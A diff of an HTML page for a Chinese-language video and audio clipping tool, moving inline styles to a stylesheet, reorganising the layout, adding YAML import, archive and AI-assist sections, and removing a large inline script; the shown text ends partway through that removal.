@@ -5,102 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>✂️ 切片</title>
   <link rel="stylesheet" href="style.css">
-  <style>
-    .clip-container { max-width: 960px; margin: 0 auto; padding: 1rem 1.5rem; }
-    .clip-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 1rem; }
-    .clip-header h2 { font-size: 1.1rem; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; flex:1; margin-right:1rem; }
-    .back-link { color: var(--pink); text-decoration: none; font-weight: 500; font-size: 0.9rem; white-space: nowrap; }
-    .back-link:hover { text-decoration: underline; }
-
-    .clip-section { background: var(--white); border-radius: var(--radius); padding: 1.25rem; margin-bottom: 1rem; box-shadow: var(--shadow); }
-    .clip-section h3 { font-size: 1rem; margin-bottom: 0.75rem; display: flex; align-items: center; gap: 0.4rem; }
-
-    /* Preview */
-    .preview-area { background: #1a1a1a; border-radius: var(--radius-sm); overflow: hidden; margin-bottom: 0.5rem; }
-    .preview-area video, .preview-area audio { width: 100%; display: block; max-height: 60vh; outline: none; }
-    .preview-area audio { padding: 1rem; }
-
-    .proxy-selector { display: flex; gap: 0.35rem; flex-wrap: wrap; margin-bottom: 0.75rem; align-items: center; }
-    .proxy-selector label { font-size: 0.8rem; font-weight: 500; white-space: nowrap; color: var(--text-light); }
-    .proxy-selector select { padding: 0.3rem 0.5rem; border: 2px solid var(--soft-blue); border-radius: var(--radius-sm); font-size: 0.85rem; }
-    .proxy-selector select:focus { border-color: var(--pink); outline: none; }
-    .proxy-type-badge { font-size: 0.7rem; padding: 0.1rem 0.35rem; border-radius: 999px; font-weight: 600; }
-    .proxy-type-badge.video { background: #D5F5E3; color: #1E8449; }
-    .proxy-type-badge.audio { background: #D6EAF8; color: #2471A3; }
-
-    .preview-fallback { color: #aaa; text-align: center; padding: 1rem; font-size: 0.85rem; }
-
-    /* Workspace */
-    .workspace-row { display: flex; gap: 0.5rem; align-items: center; flex-wrap: wrap; }
-    .workspace-row label { font-size: 0.85rem; font-weight: 500; white-space: nowrap; }
-    .workspace-row input[type="text"] { width: 6.5rem; padding: 0.4rem 0.5rem; border: 2px solid var(--soft-blue); border-radius: var(--radius-sm); font-size: 0.9rem; font-family: monospace; text-align: center; }
-    .workspace-row input:focus { border-color: var(--pink); outline: none; box-shadow: 0 0 0 3px rgba(255,182,193,0.2); }
-    .btn-ws { padding: 0.35rem 0.7rem; border-radius: 999px; border: 1px solid #e0e0e0; background: var(--white); font-size: 0.8rem; cursor: pointer; transition: var(--transition); white-space: nowrap; }
-    .btn-ws:hover { background: #f5f5f5; }
-    .btn-ws.primary { background: var(--pink); color: var(--white); border-color: var(--pink); }
-    .btn-ws.primary:hover { background: #FF9AAF; }
-    .btn-ws.danger { color: #C0392B; border-color: #F5B7B1; }
-    .btn-ws.danger:hover { background: #FADBD8; }
-
-    /* Clip cards */
-    .clip-card { display: flex; align-items: center; gap: 0.5rem; padding: 0.5rem 0.6rem; border:1px solid #f0f0f0; border-radius:var(--radius-sm); margin-bottom:0.35rem; font-size:0.85rem; flex-wrap:wrap; }
-    .clip-card-name { font-weight:600; min-width:4rem; max-width:10rem; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
-    .clip-card-time { font-family:monospace; color:var(--text-light); white-space:nowrap; font-size:0.8rem; }
-    .clip-card-desc { color:var(--text-light); font-size:0.78rem; flex:1; min-width:5rem; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
-    .clip-card-actions { display:flex; gap:0.25rem; flex-shrink:0; }
-    .clip-card-actions button { padding:0.2rem 0.45rem; border-radius:999px; border:1px solid #e0e0e0; background:var(--white); font-size:0.72rem; cursor:pointer; transition:var(--transition); white-space:nowrap; }
-    .clip-card-actions button:hover { background:#f5f5f5; }
-    .empty-hint { text-align:center; color:var(--text-light); font-size:0.85rem; padding:1rem; }
-
-    /* Collapsible */
-    .collapsible-header { cursor:pointer; user-select:none; }
-    .collapsible-header .arrow { display:inline-block; transition:transform 0.2s; font-size:0.7rem; margin-right:0.3rem; }
-    .collapsible-header.open .arrow { transform:rotate(90deg); }
-    .section-actions { display:flex; gap:0.35rem; margin-bottom:0.75rem; flex-wrap:wrap; }
-
-    .badge { display:inline-block; font-size:0.7rem; padding:0.15rem 0.4rem; border-radius:999px; font-weight:600; }
-    .badge-public { background:#D5F5E3; color:#1E8449; }
-    .badge-featured { background:#FCF3CF; color:#B7950B; }
-    .badge-own { background:#E8DAEF; color:#7D3C98; }
-
-    /* Identity modal */
-    .identity-overlay { position:fixed; inset:0; background:rgba(0,0,0,0.55); display:flex; align-items:center; justify-content:center; z-index:10000; }
-    .identity-dialog { background:var(--white); border-radius:var(--radius); padding:2rem; max-width:380px; width:90vw; box-shadow:0 8px 30px rgba(0,0,0,0.22); }
-    .identity-dialog h3 { margin-bottom:0.75rem; }
-    .identity-dialog p { font-size:0.85rem; color:var(--text-light); margin-bottom:1rem; }
-    .identity-dialog input[type="text"] { width:100%; padding:0.6rem 0.75rem; border:2px solid var(--soft-blue); border-radius:var(--radius-sm); font-size:0.95rem; }
-    .identity-dialog input:focus { border-color:var(--pink); outline:none; box-shadow:0 0 0 3px rgba(255,182,193,0.2); }
-    .identity-dialog label { display:flex; align-items:center; gap:0.4rem; font-size:0.85rem; margin:0.75rem 0; cursor:pointer; }
-    .identity-dialog .btn-confirm { display:block; width:100%; margin-top:1rem; padding:0.65rem; border-radius:999px; border:none; background:var(--pink); color:var(--white); font-size:0.95rem; font-weight:600; cursor:pointer; transition:var(--transition); }
-    .identity-dialog .btn-confirm:hover { background:#FF9AAF; }
-    .identity-dialog .btn-confirm:disabled { opacity:0.5; cursor:not-allowed; }
-
-    /* Export modal */
-    .export-overlay { position:fixed; inset:0; background:rgba(0,0,0,0.4); display:flex; align-items:center; justify-content:center; z-index:9999; }
-    .export-dialog { background:var(--white); border-radius:var(--radius); padding:1.5rem; max-width:600px; width:95vw; box-shadow:0 8px 30px rgba(0,0,0,0.18); }
-    .export-dialog h3 { margin-bottom:0.75rem; }
-    .export-cmd { background:#1a1a1a; color:#0f0; font-family:monospace; font-size:0.8rem; padding:0.75rem; border-radius:var(--radius-sm); overflow-x:auto; white-space:pre-wrap; word-break:break-all; margin-bottom:0.75rem; max-height:10rem; overflow-y:auto; }
-    .export-actions { display:flex; gap:0.5rem; flex-wrap:wrap; }
-    .btn-export { padding:0.5rem 1rem; border-radius:999px; border:none; font-weight:600; font-size:0.85rem; cursor:pointer; transition:var(--transition); }
-    .btn-export.copy { background:var(--soft-blue); color:var(--text); }
-    .btn-export.copy:hover { background:#9AD8F0; }
-    .btn-export.dl { background:var(--pink); color:var(--white); }
-    .btn-export.dl:hover { background:#FF9AAF; }
-    .btn-export.close { background:#f0f0f0; color:var(--text); }
-
-    .sort-toggle { display:flex; gap:0.25rem; margin-bottom:0.5rem; }
-    .sort-toggle button { padding:0.25rem 0.6rem; border-radius:999px; border:1px solid #e0e0e0; background:var(--white); font-size:0.78rem; cursor:pointer; transition:var(--transition); }
-    .sort-toggle button.active { background:var(--pink); color:var(--white); border-color:var(--pink); }
-    .shared-meta { font-size:0.75rem; color:var(--text-light); }
-
-    @media (max-width:640px) {
-      .clip-container { padding:0.5rem 0.75rem; }
-      .workspace-row { gap:0.3rem; }
-      .workspace-row input[type="text"] { width:5.5rem; }
-      .clip-card { flex-direction:column; align-items:flex-start; gap:0.2rem; }
-      .clip-card-actions { align-self:flex-end; }
-    }
-  </style>
+  <link rel="stylesheet" href="clip.css">
 </head>
 <body>
   <header class="site-header">
@@ -115,66 +20,100 @@
       <a href="/" class="back-link">← 回画廊</a>
     </div>
 
-    <!-- Preview -->
-    <div class="clip-section">
-      <div class="preview-area" id="preview-area">
-        <video id="preview-video" controls playsInline preload="metadata"></video>
+    <div class="clip-layout">
+      <!-- Stage: the player and the time controls that act on it. Sticky in
+           both layouts, because `⟵ 当前` reads the playhead and is useless if
+           the player has scrolled away. -->
+      <div class="clip-stage" id="clip-stage">
+        <div class="clip-section stage-card">
+          <div class="stage-bar">
+            <div class="proxy-selector" id="proxy-selector" hidden>
+              <label for="proxy-select">📹 预览源</label>
+              <select id="proxy-select"></select>
+            </div>
+            <button class="btn-icon" id="btn-toggle-preview" title="折叠 / 展开播放器" aria-expanded="true">▾</button>
+          </div>
+
+          <div class="preview-area" id="preview-area">
+            <video id="preview-video" controls playsInline preload="metadata"></video>
+          </div>
+          <div class="preview-fallback" id="preview-note" hidden></div>
+
+          <div class="workspace">
+            <div class="ws-fields">
+              <div class="ws-field">
+                <label for="ws-start">开始</label>
+                <input type="text" id="ws-start" placeholder="0:00.0" autocomplete="off" inputmode="decimal">
+                <button class="btn-ws" id="btn-set-start" title="用当前播放位置">⟵ 当前</button>
+              </div>
+              <div class="ws-field">
+                <label for="ws-end">结束</label>
+                <input type="text" id="ws-end" placeholder="0:10.0" autocomplete="off" inputmode="decimal">
+                <button class="btn-ws" id="btn-set-end" title="用当前播放位置">⟵ 当前</button>
+              </div>
+            </div>
+            <div class="ws-actions">
+              <button class="btn-ws primary" id="btn-preview-seg">▶ 预览</button>
+              <button class="btn-ws" id="btn-stage">📥 暂存</button>
+              <button class="btn-ws danger" id="btn-clear-ws">清空</button>
+            </div>
+            <div id="ws-hint" class="ws-hint" hidden></div>
+          </div>
+        </div>
       </div>
-      <div class="proxy-selector" id="proxy-selector" hidden>
-        <label for="proxy-select">📹 预览源:</label>
-        <select id="proxy-select"></select>
+
+      <div class="clip-side">
+        <!-- Staging -->
+        <div class="clip-section">
+          <h3>📋 暂存区 <span class="h3-count" id="staging-count"></span></h3>
+          <div id="staging-origin" class="staging-origin" hidden></div>
+          <div class="section-actions">
+            <button class="btn-ws" id="btn-commit-all">📦 归档为...</button>
+            <button class="btn-ws" id="btn-export-yaml">📤 导出 YAML</button>
+            <button class="btn-ws" id="btn-import-yaml">📥 导入 YAML</button>
+            <button class="btn-ws danger" id="btn-clear-staging">🗑 清空暂存</button>
+          </div>
+          <div id="staging-list"><div class="empty-hint">暂存区为空。在工作区设置时间后点击"暂存"。</div></div>
+        </div>
+
+        <!-- Archive -->
+        <div class="clip-section">
+          <h3 class="collapsible-header" id="archive-header">
+            <span class="arrow">▶</span> 🗄 归档区 <span class="h3-count" id="archive-count"></span>
+          </h3>
+          <div id="archive-body" hidden>
+            <div class="section-actions">
+              <button class="btn-ws" id="btn-export-archive">📤 导出全部归档 YAML</button>
+            </div>
+            <div id="archive-list"><div class="empty-hint">归档区为空。</div></div>
+          </div>
+        </div>
+
+        <!-- Shared -->
+        <div class="clip-section">
+          <h3>🌐 共享区</h3>
+          <div class="sort-toggle">
+            <button id="sort-time" class="active">🕐 最新</button>
+            <button id="sort-likes">❤️ 最多赞</button>
+          </div>
+          <div id="shared-list"><div class="empty-hint">加载中...</div></div>
+        </div>
       </div>
-      <div class="preview-fallback" id="preview-note" hidden></div>
     </div>
 
-    <!-- Workspace -->
-    <div class="clip-section">
-      <h3>🕐 工作区</h3>
-      <div class="workspace-row">
-        <label for="ws-start">开始:</label>
-        <input type="text" id="ws-start" placeholder="0:00.0" autocomplete="off">
-        <button class="btn-ws" id="btn-set-start" title="用当前播放位置">⟵ 当前</button>
-        <label for="ws-end">结束:</label>
-        <input type="text" id="ws-end" placeholder="0:10.0" autocomplete="off">
-        <button class="btn-ws" id="btn-set-end" title="用当前播放位置">当前 ⟶</button>
-        <button class="btn-ws primary" id="btn-preview-seg">▶ 预览</button>
-        <button class="btn-ws" id="btn-stage">📥 暂存</button>
-        <button class="btn-ws danger" id="btn-clear-ws">清空</button>
-      </div>
-      <div id="ws-hint" style="font-size:0.78rem;color:var(--text-light);margin-top:0.4rem;" hidden></div>
-    </div>
-
-    <!-- Staging -->
-    <div class="clip-section">
-      <h3>📋 暂存区 <span style="font-weight:400;font-size:0.85rem;color:var(--text-light);" id="staging-count"></span></h3>
+    <!-- AI assist. Outside .clip-layout on purpose: as a child of .clip-side
+         it would sit beside the sticky player on desktop and land mid-page,
+         which is not the bottom in either layout. Here it is the last thing
+         on the page in both. -->
+    <div class="clip-section ai-section">
+      <h3>🤖 AI 辅助</h3>
+      <p class="ai-note">把 skill 和素材交给你的 AI，让它输出片段列表，再用上面暂存区的「📥 导入 YAML」导入。</p>
       <div class="section-actions">
-        <button class="btn-ws" id="btn-commit-all">📦 全部归档</button>
-        <button class="btn-ws" id="btn-export-yaml">📤 导出 YAML</button>
-        <button class="btn-ws" id="btn-import-yaml">📥 导入 YAML</button>
-        <button class="btn-ws danger" id="btn-clear-staging">🗑 清空暂存</button>
+        <a class="btn-ws" id="btn-skill-dl" href="/api/skill?download=1" download="SKILL.md">⬇ 下载 skill</a>
+        <button class="btn-ws" id="btn-skill-copy">📋 复制 skill</button>
       </div>
-      <div id="staging-list"><div class="empty-hint">暂存区为空。在工作区设置时间后点击"暂存"。</div></div>
-    </div>
-
-    <!-- Archive -->
-    <div class="clip-section">
-      <h3 class="collapsible-header" id="archive-header">
-        <span class="arrow">▶</span> 🗄 归档区 <span style="font-weight:400;font-size:0.85rem;color:var(--text-light);" id="archive-count"></span>
-      </h3>
-      <div id="archive-body" hidden>
-        <button class="btn-ws" id="btn-export-archive" style="margin:0.75rem 0 0.5rem;">📤 导出归档 YAML</button>
-        <div id="archive-list"><div class="empty-hint">归档区为空。</div></div>
-      </div>
-    </div>
-
-    <!-- Shared -->
-    <div class="clip-section">
-      <h3>🌐 共享区</h3>
-      <div class="sort-toggle">
-        <button id="sort-time" class="active">🕐 最新</button>
-        <button id="sort-likes">❤️ 最多赞</button>
-      </div>
-      <div id="shared-list"><div class="empty-hint">加载中...</div></div>
+      <h4 class="ai-sub">📎 关联文件 <span class="h3-count" id="attachment-count"></span></h4>
+      <div id="attachment-list"><div class="empty-hint">加载中...</div></div>
     </div>
   </div>
 
@@ -184,11 +123,14 @@
   <div class="identity-overlay" id="identity-modal" hidden>
     <div class="identity-dialog">
       <h3>🐾 身份确认</h3>
-      <p>上传切片、点赞等操作需要身份标识。请选择一个昵称，它将显示在你公开的切片旁。</p>
+      <p class="dialog-note">上传切片、点赞等操作需要身份标识。请选择一个昵称，它将显示在你公开的切片旁。</p>
       <input type="text" id="identity-nickname" placeholder="昵称 (例如: 小猫迷)" maxlength="32" autocomplete="off">
       <label><input type="checkbox" id="identity-agree"> 我同意被追踪以启用切片功能</label>
-      <p style="font-size:0.75rem;color:var(--text-light);">我们会存储一个随机标识符以关联你的切片和点赞。不会收集个人信息。</p>
-      <button class="btn-confirm" id="btn-identity-confirm" disabled>确认</button>
+      <p class="dialog-note fine">我们会存储一个随机标识符以关联你的切片和点赞。不会收集个人信息。</p>
+      <div class="identity-actions">
+        <button class="btn-confirm" id="btn-identity-confirm" disabled>确认</button>
+        <button class="btn-confirm ghost" id="btn-identity-cancel">取消</button>
+      </div>
     </div>
   </div>
 
@@ -196,463 +138,66 @@
   <div class="export-overlay" id="export-modal" hidden>
     <div class="export-dialog">
       <h3 id="export-title">⬇ 导出切片</h3>
-      <p style="font-size:0.85rem;color:var(--text-light);margin-bottom:0.5rem;">使用以下 ffmpeg 命令下载并裁剪高质量原片：</p>
-      <div class="export-cmd" id="export-cmd"></div>
-      <p style="font-size:0.8rem;color:var(--text-light);margin-bottom:0.75rem;">需要安装 <code>ffmpeg</code>。参数 <code>-c copy</code> 表示不重新编码，速度最快且无损。</p>
-      <div class="export-actions">
+
+      <!-- One-click first: it is what almost everyone wants. The ffmpeg command
+           stays below it, unchanged, as the path for anything the browser
+           declines and for people who would rather script it. -->
+      <div class="quick-dl" id="quick-dl">
+        <button class="btn-export dl" id="btn-quick-dl">⬇ 一键下载（浏览器直接剪切）</button>
+        <p class="dialog-note fine" id="quick-note">正在读取索引…</p>
+        <div class="quick-bar" id="quick-bar" hidden><span id="quick-fill"></span></div>
+      </div>
+
+      <details class="export-adv" id="export-adv">
+        <summary>或使用 ffmpeg 命令</summary>
+        <p class="dialog-note">下载并裁剪高质量原片：</p>
+        <div class="export-cmd" id="export-cmd"></div>
+        <p class="dialog-note fine">需要安装 <code>ffmpeg</code>。参数 <code>-c copy</code> 表示不重新编码，速度最快且无损。</p>
         <button class="btn-export copy" id="btn-copy-cmd">📋 复制命令</button>
+      </details>
+
+      <div class="export-actions">
         <button class="btn-export dl" id="btn-dl-full">⬇ 下载完整原片</button>
         <button class="btn-export close" id="btn-close-export">关闭</button>
       </div>
     </div>
   </div>
 
-  <script>
-    'use strict';
-    const STAGING_KEY_PREFIX = 'zcll.clips.staging.';
-    const ARCHIVE_KEY_PREFIX = 'zcll.clips.archive.';
-    const $ = id => document.getElementById(id);
+  <!-- Import modal -->
+  <div class="export-overlay" id="import-modal" hidden>
+    <div class="export-dialog">
+      <h3>📥 导入 YAML</h3>
+      <p class="dialog-note">粘贴片段描述，每段以 <code>- name:</code> 开头。<br>「导入到暂存区」把所有片段放进暂存区；带 <code>archive_name:</code> 表头的归档文档可用「导入为归档」还原成一个或多个归档。</p>
+      <textarea id="import-text" class="import-text" spellcheck="false" placeholder="- name: &quot;开场&quot;
+  description: &quot;&quot;
+  start_time: 0
+  end_time: 12.5"></textarea>
+      <div class="import-error" id="import-error" hidden></div>
+      <div class="export-actions">
+        <button class="btn-export dl" id="btn-import-confirm">导入到暂存区</button>
+        <button class="btn-export copy" id="btn-import-archive">导入为归档</button>
+        <button class="btn-export close" id="btn-close-import">取消</button>
+      </div>
+    </div>
+  </div>
 
-    let filePath = '', fileKey = '', fileType = '';    // 'video' or 'audio'
-    let proxies = [];       // available proxy records
-    let activeProxy = null; // currently selected proxy key (or null for original)
-    let identity = null;
-    let staging = [], archive = [];
-    let workspaceDirty = false;
-    let sharedSort = 'time';
-    let previewTimer = null;
-    let isAudio = false;    // true if the active media is audio-only
+  <!-- Commit-to-archive modal -->
+  <div class="export-overlay" id="commit-modal" hidden>
+    <div class="export-dialog">
+      <h3 id="commit-title">📦 归档暂存区</h3>
+      <p class="dialog-note" id="commit-hint"></p>
+      <input type="text" id="commit-name" class="commit-name" maxlength="80" placeholder="归档名称 (例如: 第 12 期精彩合集)" autocomplete="off">
+      <textarea id="commit-desc" class="commit-desc" maxlength="500" placeholder="整体描述 (可选)"></textarea>
+      <div class="import-error" id="commit-error" hidden></div>
+      <div class="export-actions">
+        <button class="btn-export dl" id="btn-commit-confirm">保存归档</button>
+        <button class="btn-export copy" id="btn-commit-as-new" hidden>另存为新归档</button>
+        <button class="btn-export close" id="btn-close-commit">取消</button>
+      </div>
+    </div>
+  </div>
 
-    // DOM
-    const el = {
-      filename: $('clip-filename'), video: $('preview-video'), previewArea: $('preview-area'),
-      proxySelector: $('proxy-selector'), proxySelect: $('proxy-select'), previewNote: $('preview-note'),
-      wsStart: $('ws-start'), wsEnd: $('ws-end'), wsHint: $('ws-hint'),
-      stagingList: $('staging-list'), stagingCount: $('staging-count'),
-      archiveList: $('archive-list'), archiveCount: $('archive-count'),
-      archiveHeader: $('archive-header'), archiveBody: $('archive-body'),
-      sharedList: $('shared-list'),
-      identityModal: $('identity-modal'), identityNickname: $('identity-nickname'),
-      identityAgree: $('identity-agree'), identityConfirm: $('btn-identity-confirm'),
-      exportModal: $('export-modal'), exportTitle: $('export-title'), exportCmd: $('export-cmd'),
-      sortTime: $('sort-time'), sortLikes: $('sort-likes'),
-    };
-
-    async function init() {
-      const params = new URLSearchParams(location.search);
-      filePath = params.get('file') || '';
-      fileKey = params.get('key') || '';
-      fileType = params.get('type') || 'video';
-
-      if (!filePath || !fileKey) { el.filename.textContent = '❌ 缺少文件参数'; return; }
-      const name = filePath.split('/').pop() || filePath;
-      el.filename.textContent = (fileType === 'audio' ? '🎵 ' : '✂️ ') + name;
-      el.filename.title = filePath;
-
-      isAudio = (fileType === 'audio');
-      loadLocalData();
-      setupEvents();
-      loadProxies();
-      renderAll();
-      // Must finish before the shared list renders: renderShared decides the
-      // "我的"/delete affordance from `identity`, and clicking ❤️ or 🚩 while it
-      // is still null opens the identity dialog — confirming there used to mint
-      // a second id and strand every clip this person already owned.
-      await checkIdentity();
-      loadSharedClips();
-    }
-
-    // ── Local data ──
-    function stagingKey() { return STAGING_KEY_PREFIX + filePath; }
-    function archiveKey() { return ARCHIVE_KEY_PREFIX + filePath; }
-    function loadLocalData() {
-      try { staging = JSON.parse(localStorage.getItem(stagingKey()) || '[]'); } catch (_) { staging = []; }
-      try { archive = JSON.parse(localStorage.getItem(archiveKey()) || '[]'); } catch (_) { archive = []; }
-    }
-    function saveLocalData() {
-      try { localStorage.setItem(stagingKey(), JSON.stringify(staging)); } catch (_) {}
-      try { localStorage.setItem(archiveKey(), JSON.stringify(archive)); } catch (_) {}
-    }
-
-    // ── Identity ──
-    async function checkIdentity() {
-      try {
-        const resp = await fetch('/api/identity/me');
-        if (resp.ok) { const data = await resp.json(); identity = data.identity || null; }
-      } catch (_) { identity = null; }
-    }
-    async function requestIdentity() {
-      const nickname = el.identityNickname.value.trim();
-      if (!nickname) return;
-      el.identityConfirm.disabled = true; el.identityConfirm.textContent = '⏳ ...';
-      try {
-        const resp = await fetch('/api/identity', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({nickname}) });
-        if (resp.ok) { const data = await resp.json(); identity = {id:data.id, nickname:data.nickname}; el.identityModal.hidden = true; }
-        else alert('身份创建失败，请重试。');
-      } catch (_) { alert('网络错误，请重试。'); }
-      finally { el.identityConfirm.disabled = false; el.identityConfirm.textContent = '确认'; }
-    }
-    function ensureIdentity() { if (!identity) { el.identityModal.hidden = false; el.identityNickname.focus(); return false; } return true; }
-
-    // ── Proxies ──
-    async function loadProxies() {
-      try {
-        const resp = await fetch('/api/proxy?file_path=' + encodeURIComponent(filePath));
-        if (resp.ok) { const data = await resp.json(); proxies = data.proxies || []; }
-      } catch (_) { proxies = []; }
-      setupPlayer();
-    }
-
-    function setupPlayer() {
-      const options = [{ key: '', label: '📀 原片 (' + (isAudio ? '音频' : '视频') + ')', type: fileType }];
-      for (const p of proxies) {
-        const typeStr = p.content_type && p.content_type.startsWith('audio/') ? 'audio' : 'video';
-        const typeIcon = typeStr === 'audio' ? '🎵' : '🎬';
-        options.push({ key: p.key, label: typeIcon + ' ' + (p.label || '代理'), type: typeStr });
-      }
-
-      if (options.length > 1) {
-        el.proxySelector.hidden = false;
-        // Built with DOM APIs, not innerHTML: the label is stored text and would
-        // otherwise be parsed as markup on this public page.
-        el.proxySelect.replaceChildren(...options.map((o, i) => new Option(o.label, String(i))));
-        el.proxySelect.onchange = () => switchSource(options[parseInt(el.proxySelect.value)]);
-      } else {
-        el.proxySelector.hidden = true;
-      }
-
-      if (proxies.length === 0) {
-        el.previewNote.hidden = false;
-        el.previewNote.textContent = isAudio
-          ? '💡 音频文件可直接裁剪，无需代理。'
-          : '⚠️ 该视频无代理文件，使用原片预览。原片较大，加载可能较慢。';
-      } else {
-        el.previewNote.hidden = true;
-      }
-
-      switchSource(options[0]);
-    }
-
-    function switchSource(opt) {
-      activeProxy = opt.key || null;
-      const isNowAudio = opt.type === 'audio';
-      const src = activeProxy
-        ? '/api/file/' + encodePath(activeProxy)
-        : '/api/file/' + encodePath(fileKey);
-
-      // Swap between <video> and <audio> elements as needed
-      const currentEl = el.previewArea.querySelector('video, audio');
-      if (isNowAudio && currentEl && currentEl.tagName === 'VIDEO') {
-        const audio = document.createElement('audio');
-        audio.id = 'preview-video'; // keep the same id for easy ref
-        audio.controls = true;
-        audio.preload = 'metadata';
-        audio.style.cssText = 'width:100%;display:block;padding:1rem;outline:none;';
-        currentEl.replaceWith(audio);
-        el.video = audio;
-      } else if (!isNowAudio && currentEl && currentEl.tagName === 'AUDIO') {
-        const video = document.createElement('video');
-        video.id = 'preview-video';
-        video.controls = true;
-        video.playsInline = true;
-        video.preload = 'metadata';
-        video.style.cssText = 'width:100%;display:block;max-height:60vh;outline:none;';
-        currentEl.replaceWith(video);
-        el.video = video;
-      }
-      el.video = el.previewArea.querySelector('video, audio');
-      el.video.src = src;
-      isAudio = isNowAudio;
-    }
-
-    // ── Events ──
-    function setupEvents() {
-      $('btn-set-start').addEventListener('click', () => setTimeFromMedia('start'));
-      $('btn-set-end').addEventListener('click', () => setTimeFromMedia('end'));
-      $('btn-preview-seg').addEventListener('click', previewSegment);
-      $('btn-stage').addEventListener('click', stageCurrent);
-      $('btn-clear-ws').addEventListener('click', clearWorkspace);
-      $('btn-commit-all').addEventListener('click', commitAll);
-      $('btn-export-yaml').addEventListener('click', () => exportYAML(staging));
-      $('btn-import-yaml').addEventListener('click', importYAML);
-      $('btn-clear-staging').addEventListener('click', clearStaging);
-      $('btn-export-archive').addEventListener('click', () => exportYAML(archive));
-      el.archiveHeader.addEventListener('click', toggleArchive);
-      el.sortTime.addEventListener('click', () => { sharedSort = 'time'; loadSharedClips(); });
-      el.sortLikes.addEventListener('click', () => { sharedSort = 'likes'; loadSharedClips(); });
-      el.identityAgree.addEventListener('change', updateIdentityBtn);
-      el.identityNickname.addEventListener('input', updateIdentityBtn);
-      el.identityConfirm.addEventListener('click', requestIdentity);
-      $('btn-copy-cmd').addEventListener('click', copyExportCmd);
-      $('btn-dl-full').addEventListener('click', downloadFullFile);
-      $('btn-close-export').addEventListener('click', () => { el.exportModal.hidden = true; });
-      el.exportModal.addEventListener('click', e => { if (e.target === el.exportModal) el.exportModal.hidden = true; });
-      el.wsStart.addEventListener('input', () => { workspaceDirty = true; });
-      el.wsEnd.addEventListener('input', () => { workspaceDirty = true; });
-      document.addEventListener('keydown', e => {
-        if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') return;
-        if (e.key === '[') setTimeFromMedia('start');
-        if (e.key === ']') setTimeFromMedia('end');
-        if (e.key === ' ' || e.code === 'Space') { e.preventDefault(); previewSegment(); }
-      });
-      window.addEventListener('beforeunload', e => {
-        if (workspaceDirty || staging.length > 0) { e.preventDefault(); e.returnValue = ''; }
-      });
-    }
-    function updateIdentityBtn() {
-      el.identityConfirm.disabled = !el.identityAgree.checked || !el.identityNickname.value.trim();
-    }
-
-    // ── Time ──
-    function parseTime(s) {
-      s = s.trim(); if (!s) return NaN;
-      const parts = s.split(':');
-      if (parts.length === 2) return parseInt(parts[0]) * 60 + parseFloat(parts[1]);
-      if (parts.length === 3) return parseInt(parts[0]) * 3600 + parseInt(parts[1]) * 60 + parseFloat(parts[2]);
-      return parseFloat(s);
-    }
-    function formatTime(seconds) {
-      if (isNaN(seconds) || seconds < 0) return '0:00.0';
-      const m = Math.floor(seconds / 60), s = (seconds % 60).toFixed(1);
-      return m + ':' + (parseFloat(s) < 10 ? '0' : '') + s;
-    }
-    function getWorkspaceTimes() {
-      const start = parseTime(el.wsStart.value), end = parseTime(el.wsEnd.value);
-      if (isNaN(start) || isNaN(end) || start >= end) return null;
-      return { start, end };
-    }
-    function setTimeFromMedia(which) {
-      const t = el.video.currentTime;
-      if (which === 'start') el.wsStart.value = formatTime(t);
-      else el.wsEnd.value = formatTime(t);
-      workspaceDirty = true;
-    }
-    function setWorkspace(start, end) {
-      if (workspaceDirty && !confirm('工作区有未保存的修改，是否覆盖？')) return;
-      el.wsStart.value = formatTime(start); el.wsEnd.value = formatTime(end); workspaceDirty = false;
-    }
-    function clearWorkspace() { el.wsStart.value = ''; el.wsEnd.value = ''; workspaceDirty = false; el.wsHint.hidden = true; }
-
-    // ── Preview ──
-    function previewSegment() {
-      const times = getWorkspaceTimes();
-      if (!times) { el.wsHint.textContent = '⚠️ 请设置有效的开始和结束时间'; el.wsHint.hidden = false; return; }
-      el.wsHint.hidden = true;
-      if (previewTimer) clearTimeout(previewTimer);
-      const vid = el.video;
-      vid.currentTime = times.start;
-      vid.play().catch(() => {});
-      function checkEnd() { if (vid.currentTime >= times.end || vid.paused) { vid.pause(); previewTimer = null; return; } previewTimer = setTimeout(checkEnd, 100); }
-      previewTimer = setTimeout(checkEnd, 100);
-    }
-
-    // ── Staging ──
-    function stageCurrent() {
-      const times = getWorkspaceTimes();
-      if (!times) { el.wsHint.textContent = '⚠️ 请设置有效的开始和结束时间'; el.wsHint.hidden = false; return; }
-      el.wsHint.hidden = true;
-      staging.push({ id:'s'+Date.now()+'-'+Math.random().toString(36).slice(2,8), name:'片段 '+(staging.length+1), description:'', startTime:times.start, endTime:times.end });
-      saveLocalData(); clearWorkspace(); renderStaging();
-    }
-    function renameClip(id, list) {
-      const c = list.find(x => x.id === id); if (!c) return;
-      const n = prompt('新名称:', c.name); if (n !== null && n.trim()) { c.name = n.trim(); saveLocalData(); renderAll(); }
-    }
-    function editDescription(id, list) {
-      const c = list.find(x => x.id === id); if (!c) return;
-      const d = prompt('描述:', c.description || ''); if (d !== null) { c.description = d.trim(); saveLocalData(); renderAll(); }
-    }
-    function deleteClip(id, list) { const i = list.findIndex(x => x.id === id); if (i !== -1) { list.splice(i, 1); saveLocalData(); renderAll(); } }
-    function commitAll() { if (!staging.length) return; archive.push(...staging); staging = []; saveLocalData(); renderAll(); }
-    function clearStaging() { if (!staging.length) return; if (!confirm('确认清空暂存区？未归档的片段将丢失。')) return; staging = []; saveLocalData(); renderAll(); }
-
-    // ── Archive ──
-    function toggleArchive() { const h = el.archiveBody.hidden; el.archiveBody.hidden = !h; el.archiveHeader.classList.toggle('open', !h); }
-    function loadArchiveToStaging(clip) {
-      if (staging.length > 0 && !confirm('暂存区有未归档的片段，加载将清空暂存区。继续？')) return;
-      const i = archive.findIndex(c => c.id === clip.id); if (i === -1) return;
-      staging.push(...archive.splice(i, 1)); saveLocalData(); renderAll();
-    }
-
-    // ── YAML ──
-    function clipsToYAML(list) {
-      return list.map(c => `- name: ${JSON.stringify(c.name)}\n  description: ${JSON.stringify(c.description||'')}\n  start_time: ${c.startTime}\n  end_time: ${c.endTime}`).join('\n');
-    }
